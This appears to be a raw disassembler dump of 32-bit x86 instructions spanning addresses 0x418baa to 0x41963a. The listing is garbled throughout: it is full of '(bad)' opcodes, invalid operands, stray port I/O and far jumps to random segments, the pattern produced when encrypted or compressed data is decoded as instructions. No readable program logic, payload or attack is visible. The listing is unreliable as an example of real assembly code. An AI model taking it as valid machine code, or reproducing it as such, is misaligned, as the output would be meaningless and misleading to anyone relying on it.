  418baa:	adc    DWORD PTR [esi],edi
  418bac:	aam    0x4c
  418bae:	push   esp
  418baf:	out    0x88,al
  418bb1:	pop    ecx
  418bb2:	(bad)  
  418bb3:	or     edi,DWORD PTR [ebx+0x7d0886a2]
  418bb9:	pop    esp
  418bba:	ret    
  418bbb:	pop    ebp
  418bbc:	enter  0x4081,0x86
  418bc0:	and    DWORD PTR [eax-0xcd7fa99],esp
  418bc6:	popf   
  418bc7:	out    0x3d,eax
  418bc9:	inc    ebp
  418bca:	mov    ebp,0x8ec33849
  418bcf:	pop    ebx
  418bd0:	adc    eax,DWORD PTR [edi+0x60]
  418bd3:	xchg   edx,eax
  418bd4:	xor    al,0x62
  418bd6:	or     ch,BYTE PTR [ebx-0x6b13b203]
  418bdc:	inc    eax
  418bdd:	xor    BYTE PTR [esi+0x3d1515eb],bl
  418be3:	jg     0x418b7f
  418be5:	(bad)  
  418be6:	jmp    0xc639eb79
  418beb:	sub    ecx,esp
  418bed:	shr    ecx,cl
  418bef:	jmp    0x418bb2
  418bf1:	imul   ecx,eax,0x95b9f621
  418bf7:	sub    BYTE PTR [edi],0x34
  418bfa:	std    
  418bfb:	dec    ecx
  418bfc:	jne    0x418baa
  418bfe:	stos   BYTE PTR es:[edi],al
  418bff:	call   0xc68a:0x5fc6dc34
  418c06:	xchg   esp,eax
  418c07:	xor    al,0x31
  418c09:	add    DWORD PTR [esi-0x9],0xffffffe3
  418c0d:	xor    al,0x2d
  418c0f:	cmp    ch,BYTE PTR [ecx+0x36]
  418c12:	inc    esi
  418c13:	pop    edx
  418c14:	sar    DWORD PTR [esi],0xd9
  418c17:	test   BYTE PTR [edx],dl
  418c19:	test   al,0xe8
  418c1b:	xor    ch,al
  418c1d:	nop
  418c1e:	xchg   ebx,eax
  418c1f:	ret    0xba38
  418c22:	dec    eax
  418c23:	outs   dx,BYTE PTR ds:[esi]
  418c24:	adc    DWORD PTR [edi-0x3b],ebx
  418c27:	inc    esp
  418c28:	jns    0x418c31
  418c2a:	in     eax,0x98
  418c2c:	sub    DWORD PTR [ebp+ecx*2+0x38],edx
  418c30:	imul   esp,DWORD PTR [ecx],0x20547ffa
  418c36:	mov    ecx,0x692478e
  418c3b:	xchg   esp,eax
  418c3c:	or     BYTE PTR [ebp-0x35011955],0x15
  418c43:	jne    0x418c87
  418c45:	retf   
  418c46:	push   0x5d1fda42
  418c4b:	out    0xab,al
  418c4d:	lea    edi,[ecx-0x54]
  418c50:	xor    al,0x14
  418c52:	sti    
  418c53:	loopne 0x418c99
  418c55:	push   ecx
  418c56:	inc    edx
  418c57:	pop    esi
  418c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c59:	sbb    esp,esp
  418c5b:	mov    dl,0x48
  418c5d:	sbb    al,0xe0
  418c5f:	aas    
  418c60:	mov    bl,0x2c
  418c62:	xchg   ecx,eax
  418c63:	pushf  
  418c64:	or     eax,0xfa50947
  418c69:	pusha  
  418c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6b:	dec    BYTE PTR [ecx]
  418c6d:	scas   eax,DWORD PTR es:[edi]
  418c6e:	sub    DWORD PTR [ebx],esi
  418c70:	scas   eax,DWORD PTR es:[edi]
  418c71:	jns    0x418c8d
  418c73:	or     ch,BYTE PTR [edi]
  418c75:	dec    eax
  418c76:	leave  
  418c77:	jp     0x418c6e
  418c79:	fidivr DWORD PTR [esi-0x59b2f853]
  418c7f:	cmp    DWORD PTR [edx+0x22e943a0],ecx
  418c85:	repnz mov ecx,0x41c63a64
  418c8b:	sub    DWORD PTR [esi+esi*2+0xedd186],0x0
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [ecx-0x1fdd9117],cl
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x97000001
  418d0d:	mov    edx,0xc0885bb2
  418d12:	test   BYTE PTR [ebp-0x45813289],ah
  418d18:	dec    eax
  418d19:	cmp    eax,0x3cf94219
  418d1e:	or     BYTE PTR [eax],dl
  418d20:	push   edx
  418d21:	neg    bl
  418d23:	pop    edi
  418d24:	fisttp WORD PTR ds:0xa4eafaec
  418d2a:	int3   
  418d2b:	jo     0x418d02
  418d2d:	loop   0x418d6d
  418d2f:	test   BYTE PTR [ebp-0x64fb5538],cl
  418d35:	push   edi
  418d36:	outs   dx,DWORD PTR ds:[esi]
  418d37:	mul    BYTE PTR [edi]
  418d39:	mov    ds:0xdb08dc48,al
  418d3e:	push   eax
  418d3f:	mov    edi,0x5e2ada0e
  418d44:	fcmovbe st,st(7)
  418d46:	xchg   BYTE PTR [esi-0x5d2b4366],cl
  418d4c:	ret    
  418d4d:	or     DWORD PTR [ebx-0x3478b89c],edx
  418d53:	dec    eax
  418d54:	mov    ?,WORD PTR [ecx+0x5a6f1a59]
  418d5a:	mov    cl,0x9e
  418d5c:	push   ebp
  418d5d:	jle    0x418d48
  418d5f:	scas   eax,DWORD PTR es:[edi]
  418d60:	test   eax,0x3958c67d
  418d65:	cmp    esp,esi
  418d67:	push   ebp
  418d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d69:	not    DWORD PTR [ecx]
  418d6b:	jae    0x418d7b
  418d6d:	push   ebp
  418d6e:	sub    DWORD PTR [esp+edx*8+0x73],0x55
  418d73:	sahf   
  418d74:	and    al,ch
  418d76:	mov    eax,ds:0xfd9365bd
  418d7b:	mov    dl,0x83
  418d7d:	rcl    DWORD PTR [bp+si-0x54],0xb
  418d82:	out    0x62,al
  418d84:	es int3 
  418d86:	arpl   WORD PTR [ecx-0x74bf77c6],dx
  418d8c:	ins    DWORD PTR es:[edi],dx
  418d8d:	pop    ebp
  418d8e:	in     eax,0x8b
  418d90:	leave  
  418d91:	(bad)  
  418d92:	addr16 call 0x2bca9e9a
  418d98:	dec    ecx
  418d99:	sub    BYTE PTR [ecx],0x34
  418d9c:	gs or  esp,ebp
  418d9f:	adc    esp,DWORD PTR [ebx]
  418da1:	inc    ecx
  418da2:	loop   0x418db0
  418da4:	pop    esi
  418da5:	fwait
  418da6:	push   ecx
  418da7:	fcmovb st,st(1)
  418da9:	lock (bad) 
  418dab:	adc    eax,0x9320cde6
  418db0:	mov    eax,ds:0x794723af
  418db5:	mov    ecx,0x9274321a
  418dba:	jmp    0x72b6:0xec89a4cc
  418dc1:	or     BYTE PTR [esi-0xa4533e],ah
  418dc7:	adc    BYTE PTR [esp+ecx*2-0x44512238],al
  418dce:	repz loope 0x418e2f
  418dd1:	mov    esp,0xfec8bd8d
  418dd6:	and    eax,0x58bb4a88
  418ddb:	sbb    al,0xab
  418ddd:	(bad)  
  418dde:	or     al,0xeb
  418de0:	dec    esi
  418de1:	cmp    BYTE PTR [ebx+ebx*8],dh
  418de4:	fs sub eax,0x1276e5bf
  418dea:	fstp   DWORD PTR [esi-0x741559ac]
  418df0:	jbe    0x418db6
  418df2:	outs   dx,BYTE PTR ds:[esi]
  418df3:	cmp    BYTE PTR [eax+ebp*4],0x64
  418df7:	xlat   BYTE PTR ds:[ebx]
  418df8:	push   es
  418df9:	dec    ebx
  418dfa:	lea    esi,[esi]
  418dfc:	mov    ch,0xdb
  418dfe:	popf   
  418dff:	mov    al,0x68
  418e01:	and    ah,BYTE PTR [edi+0x7c5f608]
  418e07:	outs   dx,DWORD PTR ds:[esi]
  418e08:	mov    bh,0x78
  418e0a:	call   0xa5f3682e
  418e0f:	mov    cl,0x5
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x49]
  418e81:	xor    eax,0x7e5574d
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x87000001
  418e8d:	and    DWORD PTR [esi],esp
  418e8f:	add    DWORD PTR cs:[esi],0xd90bfede
  418e96:	inc    esp
  418e97:	pop    edi
  418e98:	mov    ebp,0x698d3fa4
  418e9d:	ds pop esp
  418e9f:	mov    dl,0x3d
  418ea1:	mov    ebx,0x52f81828
  418ea6:	neg    BYTE PTR [ecx-0x7b]
  418ea9:	sbb    ecx,DWORD PTR [eax]
  418eab:	mov    esp,0x523789d6
  418eb0:	clc    
  418eb1:	xor    eax,0x3a089396
  418eb6:	shr    DWORD PTR [eax-0x41],1
  418eb9:	mov    dl,0x67
  418ebb:	pop    ebx
  418ebc:	mov    dl,0xad
  418ebe:	push   esi
  418ebf:	pop    es
  418ec0:	push   edi
  418ec1:	scas   eax,DWORD PTR es:[edi]
  418ec2:	push   es
  418ec3:	stos   BYTE PTR es:[edi],al
  418ec4:	mov    ds:0x303ef2f,eax
  418ec9:	mov    dh,0x28
  418ecb:	pusha  
  418ecc:	fdivr  QWORD PTR [edi+0x5d]
  418ecf:	and    BYTE PTR [edi+esi*4],dh
  418ed2:	xor    DWORD PTR [esi],0xa
  418ed5:	call   0x6012cb29
  418eda:	outs   dx,DWORD PTR ds:[esi]
  418edb:	inc    ebx
  418edc:	push   es
  418edd:	or     dl,al
  418edf:	mov    bl,0x4b
  418ee1:	mov    al,ds:0x1a365317
  418ee6:	jl     0x418f08
  418ee8:	pop    ecx
  418eea:	mov    cs,WORD PTR [ebx]
  418eec:	inc    esi
  418eed:	jmp    0x935f6a57
  418ef2:	jmp    0xfa80:0xff26043e
  418ef9:	xor    al,0x31
  418efb:	adc    eax,0xfa078e36
  418f00:	mov    ebx,DWORD PTR [ecx-0x3a6017f3]
  418f06:	cmp    dl,BYTE PTR [ebp+0x3eff8b5]
  418f0c:	dec    edi
  418f0d:	pop    esp
  418f0e:	sub    eax,0x4f4b2d8f
  418f13:	aaa    
  418f14:	cmp    BYTE PTR [ebp-0x55],0xb
  418f18:	test   DWORD PTR [edi+ecx*2+0x5b],esp
  418f1c:	cdq    
  418f1d:	(bad)  
  418f1e:	int    0xbb
  418f20:	inc    edx
  418f21:	retf   
  418f22:	sub    DWORD PTR [esi+ebx*4],eax
  418f25:	xor    BYTE PTR fs:[edi-0x49],dl
  418f29:	jb     0x418f82
  418f2b:	add    cl,BYTE PTR [eax+edi*2+0x56750bdf]
  418f32:	push   ecx
  418f33:	fwait
  418f34:	sar    DWORD PTR [ebp+0x5ed8591b],cl
  418f3a:	and    eax,0xd7aa5fa7
  418f3f:	sub    ebp,DWORD PTR [eax-0x5c]
  418f42:	cmc    
  418f43:	xchg   edx,eax
  418f44:	cmp    dl,BYTE PTR [ecx]
  418f46:	mov    WORD PTR [esi+0x26407eef],ds
  418f4c:	lahf   
  418f4d:	xchg   ebx,esp
  418f4f:	ins    DWORD PTR es:[edi],dx
  418f50:	ret    0x290f
  418f53:	sbb    BYTE PTR [esi-0x43],bh
  418f56:	xor    al,0xed
  418f58:	sbb    edx,ecx
  418f5a:	leave  
  418f5b:	add    DWORD PTR ds:0xeb65,ecx
  418f60:	int    0x1d
  418f62:	pop    edx
  418f63:	pop    ebx
  418f64:	pop    ebx
  418f65:	jmp    0x418f40
  418f67:	mov    edi,0x1cce1d7f
  418f6c:	jnp    0x418fa1
  418f6e:	mov    eax,0xc9ce44dc
  418f73:	xchg   ebp,eax
  418f74:	push   es
  418f75:	fist   WORD PTR [ebp-0x59]
  418f78:	in     al,0x55
  418f7a:	xor    esp,DWORD PTR [ecx-0x70]
  418f7d:	mov    eax,0x2eb1f1fe
  418f82:	xor    BYTE PTR [ebx-0x24],0x6f
  418f86:	cmc    
  418f87:	into   
  418f88:	enter  0xea7e,0x84
  418f8c:	bound  eax,QWORD PTR [edi]
  418f8e:	jns    0x418fed
  418f90:	loopne 0x418f92
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x4b150e59]
  419001:	jmp    0x1:0x8ea9c45
  419008:	add    eax,0x92000001
  41900d:	imul   ecx,DWORD PTR [ebx-0xbcd57a5],0xffffffc0
  419014:	mov    esi,gs
  419016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419017:	xchg   DWORD PTR [ebx],edx
  419019:	jmp    0x41904d
  41901b:	and    BYTE PTR [ecx+ecx*8-0x14],0x1
  419020:	aad    0x56
  419022:	fistp  DWORD PTR [ebp-0x69]
  419025:	fisubr DWORD PTR [ecx-0x4c]
  419028:	aam    0xbe
  41902a:	imul   eax,ebx,0xffffffc0
  41902d:	cmc    
  41902e:	(bad)  
  41902f:	shl    ah,cl
  419031:	xchg   esi,eax
  419032:	mov    DWORD PTR [edi-0x37c0aebd],edi
  419038:	xor    al,0xf5
  41903a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41903b:	aad    0x99
  41903d:	mov    esi,0x97555c7d
  419042:	jo     0x418ff8
  419044:	and    eax,ebx
  419046:	pop    edx
  419047:	jae    0x419000
  419049:	out    0x36,al
  41904b:	in     al,0xc3
  41904d:	or     eax,DWORD PTR [ecx+ebp*8]
  419050:	mov    al,0x5f
  419052:	pop    ss
  419053:	push   edi
  419054:	jecxz  0x418fe3
  419056:	xor    ah,bh
  419058:	mov    bh,0xfa
  41905a:	inc    esi
  41905b:	xor    edx,edi
  41905d:	or     DWORD PTR es:[edi],ecx
  419060:	fild   WORD PTR [eax-0x26]
  419063:	sub    eax,0xbc93f468
  419068:	pop    edx
  419069:	add    al,0xf3
  41906b:	cmc    
  41906c:	in     eax,0x62
  41906e:	jg     0x419078
  419070:	xlat   BYTE PTR ds:[ebx]
  419071:	mov    bh,0xa0
  419073:	sub    al,BYTE PTR [edi]
  419075:	adc    eax,0x26530f06
  41907a:	(bad)  
  41907b:	popf   
  41907c:	and    al,BYTE PTR [esi+0x6af8a004]
  419082:	cmp    cl,al
  419084:	imul   ebp,DWORD PTR [edi-0x1bb59845],0xd90cfa18
  41908e:	cwde   
  41908f:	and    dl,BYTE PTR [edi]
  419091:	and    dh,al
  419093:	mov    ebp,0xe9406d4
  419098:	adc    DWORD PTR [ecx+0x1652ead1],0x18
  41909f:	pop    eax
  4190a0:	ja     0x41908f
  4190a2:	add    eax,0x3a713f1b
  4190a7:	(bad)  
  4190a8:	mov    ebx,0x70db7422
  4190ad:	dec    ecx
  4190ae:	mov    cl,0x2b
  4190b0:	fcomip st,st(7)
  4190b2:	sub    DWORD PTR [esi+0x1b],edx
  4190b5:	pop    ebx
  4190b6:	pop    esi
  4190b7:	sub    DWORD PTR [esi+0x41cf6252],0xffffffaa
  4190be:	sub    DWORD PTR [eax+eiz*4-0x31c6d1cd],eax
  4190c5:	mov    ebx,0xd4e3b1bb
  4190ca:	test   edi,edx
  4190cc:	out    dx,al
  4190cd:	stos   DWORD PTR es:[edi],eax
  4190ce:	jne    0x4190e0
  4190d0:	call   0xe5d4:0x9cccaed2
  4190d7:	inc    edx
  4190d8:	add    ebp,DWORD PTR [esi]
  4190da:	jb     0x4190c3
  4190dc:	push   ecx
  4190dd:	cwde   
  4190de:	(bad)  
  4190df:	cmp    al,ah
  4190e1:	jo     0x419099
  4190e3:	inc    ecx
  4190e4:	les    edi,FWORD PTR ds:0xb32526a4
  4190ea:	mov    al,ds:0x5eee12eb
  4190ef:	dec    ecx
  4190f0:	pop    esp
  4190f1:	fsubrp st(3),st
  4190f3:	jmp    DWORD PTR [ebx]
  4190f5:	mov    edx,esi
  4190f7:	int3   
  4190f8:	in     al,0xfa
  4190fa:	scas   al,BYTE PTR es:[edi]
  4190fb:	mov    esi,0x15a35363
  419100:	add    BYTE PTR [ebp-0x3b],bh
  419103:	fisubr DWORD PTR [ebx+edx*2]
  419106:	push   esi
  419107:	aam    0xc0
  419109:	sub    dl,BYTE PTR [esi]
  41910b:	pop    eax
  41910c:	add    DWORD PTR [ebp-0x61],ebp
  41910f:	jo     0x41915c
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     al,BYTE PTR [eax-0x10762a72]
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0xf1000001,al
  41918d:	dec    ebx
  41918e:	cmc    
  41918f:	fcmovb st,st(6)
  419191:	jnp    0x419176
  419193:	pop    ds
  419194:	cmp    al,BYTE PTR [ecx+0x72]
  419197:	les    eax,FWORD PTR [edx+0x127583df]
  41919d:	mov    ebx,DWORD PTR [eax+0x6dc59d27]
  4191a3:	fild   DWORD PTR [eax+0x1f]
  4191a6:	enter  0x361,0xc5
  4191aa:	daa    
  4191ab:	out    0x4e,al
  4191ad:	pop    esi
  4191ae:	push   eax
  4191af:	iret   
  4191b0:	add    ebp,DWORD PTR [ecx]
  4191b2:	inc    edx
  4191b3:	pop    es
  4191b4:	ret    
  4191b5:	ret    0x7cdc
  4191b8:	mov    BYTE PTR [ebp-0x4c],ah
  4191bb:	mov    edi,0x28fd159a
  4191c0:	cmp    ebx,edx
  4191c2:	and    ebp,0xdf3d6f1
  4191c8:	mov    dh,0x0
  4191ca:	push   edx
  4191cb:	inc    edi
  4191cc:	gs enter 0x24f1,0x95
  4191d1:	push   ebx
  4191d2:	jbe    0x4191f2
  4191d4:	mov    ecx,edx
  4191d6:	pusha  
  4191d7:	inc    ebp
  4191d8:	retf   0x585a
  4191db:	cli    
  4191dc:	sub    ebx,0xcb3224d4
  4191e2:	mov    edi,0xa9f3faad
  4191e7:	in     al,0xf1
  4191e9:	dec    DWORD PTR [edx-0x53df24e9]
  4191ef:	add    bh,BYTE PTR ds:0x65443be7
  4191f5:	mov    dh,al
  4191f7:	cmp    esi,DWORD PTR [edx+0x5]
  4191fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191fb:	or     esi,edi
  4191fd:	(bad)  [esi+0x49789977]
  419203:	js     0x41927e
  419205:	add    dl,BYTE PTR [ebx-0x6a]
  419208:	pushf  
  419209:	sbb    eax,esp
  41920b:	pusha  
  41920c:	into   
  41920d:	scas   al,BYTE PTR es:[edi]
  41920e:	das    
  41920f:	jmp    0x419226
  419211:	jge    0x41919c
  419213:	pop    ss
  419214:	clc    
  419215:	int    0xac
  419217:	dec    ecx
  419218:	xchg   BYTE PTR [eax],bh
  41921a:	(bad)  
  41921b:	in     eax,dx
  41921c:	int3   
  41921d:	ror    BYTE PTR [esp+eiz*4],0x9c
  419221:	push   ebx
  419222:	add    DWORD PTR [esi-0x62afa863],ebp
  419228:	aas    
  419229:	xchg   dh,bh
  41922b:	mov    esi,0xf24bc518
  419230:	shl    dh,cl
  419232:	mov    edi,0x15a11b66
  419237:	shr    DWORD PTR [edx+0x22bfd753],1
  41923d:	stc    
  41923e:	and    BYTE PTR [edx+0x5a9bb5f0],al
  419244:	mov    bh,0x79
  419246:	fwait
  419247:	xchg   ecx,eax
  419248:	inc    esi
  419249:	rcl    BYTE PTR [ecx-0x7c],cl
  41924c:	add    eax,0xc60edcfd
  419251:	iret   
  419252:	mov    al,0x4
  419254:	data16 js 0x4191fb
  419257:	and    bl,BYTE PTR ds:0x855f0ed5
  41925d:	sbb    eax,0x712a70c6
  419262:	adc    eax,0x1cdb349d
  419267:	lods   al,BYTE PTR ds:[esi]
  419268:	jmp    0x8d93fbbe
  41926d:	or     eax,DWORD PTR [eax]
  41926f:	out    dx,al
  419270:	loopne 0x419290
  419272:	jns    0x4192e4
  419274:	sbb    BYTE PTR [ebp+0x7e5d4d9c],cl
  41927a:	(bad)  
  41927b:	jg     0x419243
  41927d:	xor    ch,BYTE PTR [eax+0x6b]
  419280:	fnsave [ebp-0x3c]
  419283:	loopne 0x419295
  419285:	mov    esp,ebp
  419287:	pop    ds
  419288:	rcr    DWORD PTR [edx+0x5e],cl
  41928b:	xlat   BYTE PTR ds:[ebx]
  41928c:	shl    BYTE PTR [ebp+ebp*4+0x518e],0x0
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	(bad)  
  419301:	test   DWORD PTR fs:[edi-0xc],esi
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0xf9000001,al
  41930d:	les    ebx,FWORD PTR [ebx-0xb4ca03a]
  419313:	aad    0x86
  419315:	shl    DWORD PTR [esi],0x75
  419318:	sub    edx,DWORD PTR ds:0x9dc12501
  41931e:	mov    ebp,0xa7fa7ed2
  419323:	fdivr  st(0),st
  419325:	cmp    ebx,esi
  419327:	dec    edx
  419328:	mul    esp
  41932a:	jne    0x4193a8
  41932c:	enter  0x77f2,0xe2
  419330:	xor    DWORD PTR [ecx+0x4189a56f],0x9ec89a12
  41933a:	(bad)  
  41933b:	xor    DWORD PTR [edx*8+0x3a128414],edx
  419342:	jp     0x41934a
  419344:	push   edx
  419345:	scas   al,BYTE PTR es:[edi]
  419346:	mov    al,ds:0xc4dbeaf
  41934b:	dec    ebp
  41934c:	mov    eax,ds:0xccd53f5f
  419351:	imul   esp,DWORD PTR [esi],0xffffffd8
  419354:	xor    BYTE PTR [ecx-0x63],ch
  419357:	cmp    eax,0xec1d7fe9
  41935c:	jno    0x41932a
  41935e:	sbb    ebp,ecx
  419360:	xchg   esi,eax
  419361:	dec    esi
  419362:	fisubr WORD PTR [edi+0x7f]
  419365:	iret   
  419366:	lods   eax,DWORD PTR ds:[esi]
  419367:	pop    ds
  419368:	ret    0xf69
  41936b:	push   edi
  41936c:	cdq    
  41936d:	ins    DWORD PTR es:[edi],dx
  41936e:	xchg   BYTE PTR [ecx-0xad5ac4f],ah
  419374:	loope  0x419302
  419376:	sti    
  419377:	lods   eax,DWORD PTR ds:[esi]
  419378:	addr16 std 
  41937a:	mov    ebp,0x69650ba9
  41937f:	sub    DWORD PTR [ecx+esi*4+0x37717152],ecx
  419386:	mov    edi,0x7cc6dbc5
  41938b:	test   BYTE PTR [eax],bl
  41938d:	add    edi,DWORD PTR [esi]
  41938f:	daa    
  419390:	mov    dh,0x51
  419392:	jmp    0x41933e
  419394:	hlt    
  419395:	pusha  
  419396:	sbb    eax,0xf5182ce7
  41939b:	mov    al,ds:0x888a5e93
  4193a0:	nop
  4193a1:	iret   
  4193a2:	xchg   edx,eax
  4193a3:	push   eax
  4193a4:	add    al,0xae
  4193a6:	data16 scas al,BYTE PTR es:[edi]
  4193a8:	test   eax,0xa8489592
  4193ad:	in     al,dx
  4193ae:	xor    BYTE PTR [ecx],ah
  4193b0:	(bad)  
  4193b1:	sbb    edx,DWORD PTR [eax+0x7f6271cb]
  4193b7:	cmp    BYTE PTR [edi+0x74],bh
  4193ba:	sar    DWORD PTR [ebp-0x1e628ee2],0x84
  4193c1:	inc    edx
  4193c2:	dec    eax
  4193c3:	mov    fs,WORD PTR [ebp+edi*1-0x302cf3f2]
  4193ca:	dec    ecx
  4193cb:	and    eax,DWORD PTR [eax]
  4193cd:	aas    
  4193ce:	fmul   DWORD PTR [eax+esi*1-0x7bd21e82]
  4193d5:	out    0xd2,al
  4193d7:	sub    eax,0x89429a49
  4193dc:	mov    ebp,0x674b04b6
  4193e1:	or     ebx,DWORD PTR [edx]
  4193e3:	adc    BYTE PTR [eax+esi*4+0x5],bl
  4193e7:	test   BYTE PTR [ecx-0x73],0xca
  4193eb:	in     al,dx
  4193ec:	gs cmp al,0x68
  4193ef:	js     0x41946e
  4193f1:	out    dx,eax
  4193f2:	pop    ebx
  4193f3:	mov    dl,0x87
  4193f5:	repz repnz sahf 
  4193f8:	sub    BYTE PTR [eax+0x25],al
  4193fb:	push   ds
  4193fc:	xchg   ax,ax
  4193fe:	mov    BYTE PTR [esi+0x1a],dl
  419401:	hlt    
  419402:	push   edi
  419403:	loope  0x419393
  419405:	xchg   esi,eax
  419406:	aas    
  419407:	lods   al,BYTE PTR ds:[esi]
  419408:	imul   ecx,DWORD PTR [ecx+edi*4-0x1adc1cc],0xffffff95
  419410:	mov    ds:0x0,al
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	imul   ecx,DWORD PTR [ebx+0xbf98503],0x1
  419487:	add    BYTE PTR ds:0xc6000001,al
  41948d:	mov    BYTE PTR [esi+0x46238005],dl
  419493:	or     al,0xd2
  419495:	mov    dh,0xfe
  419497:	jge    0x41946c
  419499:	out    dx,eax
  41949a:	mov    ah,0x89
  41949c:	jge    0x4194c8
  41949e:	push   ebx
  41949f:	sub    ebx,DWORD PTR [esi-0x7f4c7584]
  4194a5:	enter  0x9e71,0xc7
  4194a9:	sahf   
  4194aa:	jmp    0x4194be
  4194ac:	imul   esi,DWORD PTR [edi+0x3ad936df],0xdac321e7
  4194b6:	or     DWORD PTR [ebx-0x50bc2248],0x71
  4194bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194be:	and    al,0xd8
  4194c0:	pusha  
  4194c1:	mov    ebx,0xd56f1a8d
  4194c6:	mov    eax,ds
  4194c8:	pop    esi
  4194c9:	aaa    
  4194ca:	sub    edx,DWORD PTR [edi]
  4194cc:	aaa    
  4194cd:	faddp  st(7),st
  4194cf:	dec    esi
  4194d0:	dec    ebp
  4194d1:	jp     0x419457
  4194d3:	dec    ecx
  4194d4:	rcr    BYTE PTR [edi],1
  4194d6:	lods   eax,DWORD PTR ds:[esi]
  4194d7:	retf   0x7946
  4194da:	(bad)  
  4194db:	mov    al,0x53
  4194dd:	iret   
  4194de:	mov    esi,0xf4de0a91
  4194e3:	dec    edi
  4194e4:	cdq    
  4194e5:	push   ecx
  4194e6:	imul   eax,esp,0xbe72e20f
  4194ec:	stc    
  4194ed:	scas   eax,DWORD PTR es:[edi]
  4194ee:	cdq    
  4194ef:	sub    BYTE PTR [ecx-0xbc174e1],bh
  4194f5:	jns    0x419546
  4194f7:	retf   
  4194f8:	or     al,0x93
  4194fa:	loopne 0x4194c1
  4194fc:	stos   BYTE PTR es:[edi],al
  4194fd:	xchg   ecx,eax
  4194fe:	adc    cl,BYTE PTR [ebx-0x49e0fd9b]
  419504:	fsub   QWORD PTR [ebx+edx*2+0x2e]
  419508:	ja     0x419503
  41950a:	ror    esp,1
  41950c:	push   0x49
  41950e:	cmp    dh,BYTE PTR [esi+eiz*1-0x35]
  419512:	bound  edi,QWORD PTR [ebx-0x71c1a3b2]
  419518:	dec    ebx
  419519:	or     bh,BYTE PTR [edx-0x1]
  41951c:	mov    DWORD PTR [ecx+0xb],ebp
  41951f:	das    
  419520:	xchg   esp,eax
  419521:	test   BYTE PTR [eax-0x48],bl
  419524:	shl    cl,0x4
  419527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419528:	ins    DWORD PTR es:[edi],dx
  419529:	mov    edi,0x41bb524f
  41952e:	or     edx,eax
  419530:	jge    0x419589
  419532:	out    0xb,al
  419534:	pop    ebx
  419535:	mov    esp,0x62467c38
  41953a:	push   cs
  41953b:	or     al,0x90
  41953d:	mov    ds:0xe7a992ce,al
  419542:	add    eax,DWORD PTR [edi-0x62fba9f4]
  419548:	std    
  419549:	cdq    
  41954a:	jo     0x4195cb
  41954c:	loopne 0x41957f
  41954e:	out    dx,al
  41954f:	sbb    BYTE PTR [ebx],dh
  419551:	xchg   ebx,eax
  419552:	or     edx,DWORD PTR [ebp+0x2cfbee96]
  419558:	cdq    
  419559:	mov    ebp,0x21491e34
  41955e:	ss push 0x6a
  419561:	retf   0xc44a
  419564:	pop    ebp
  419565:	pop    ds
  419566:	aas    
  419567:	and    al,0x2b
  419569:	mov    ecx,DWORD PTR [ebp+0x47]
  41956c:	lods   al,BYTE PTR ds:[esi]
  41956d:	lock mov bh,0x64
  419570:	push   ss
  419571:	inc    ecx
  419572:	inc    ebp
  419573:	lods   al,BYTE PTR ds:[esi]
  419574:	loopne 0x4195ad
  419576:	jge    0x419517
  419578:	mov    ds:0xca3f2ed0,eax
  41957d:	mov    ah,0xea
  41957f:	pop    edx
  419580:	jmp    0x4195da
  419582:	and    esi,DWORD PTR [esi]
  419584:	shl    esi,cl
  419586:	xchg   ebx,eax
  419587:	pop    eax
  419588:	fcomp  st(7)
  41958a:	loop   0x4195c0
  41958c:	dec    edi
  41958d:	fsubr  DWORD PTR [esi+esi*4-0x7a]
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	test   DWORD PTR [eax+esi*4+0x1d],0x10cfe
  419608:	add    eax,0x57000001
  41960d:	out    0x7e,eax
  41960f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419610:	mov    esp,ebp
  419612:	sbb    al,0x4e
  419614:	aam    0x6c
  419616:	xchg   cx,ax
  419618:	scas   al,BYTE PTR es:[edi]
  419619:	adc    BYTE PTR [edx*1+0x4bc56761],dh
  419620:	cwde   
  419621:	stos   DWORD PTR es:[edi],eax
  419622:	aas    
  419623:	xor    eax,0xf3953a34
  419628:	mov    eax,0xcd753738
  41962d:	sub    edx,DWORD PTR [edx-0x54]
  419630:	cmp    esp,DWORD PTR [ebx-0x32278826]
  419636:	je     0x41960b
  419638:	dec    ecx
  419639:	ins    BYTE PTR es:[edi],dx
  41963a:	xor    ecx,DWORD PTR ds:0xd326fa3c
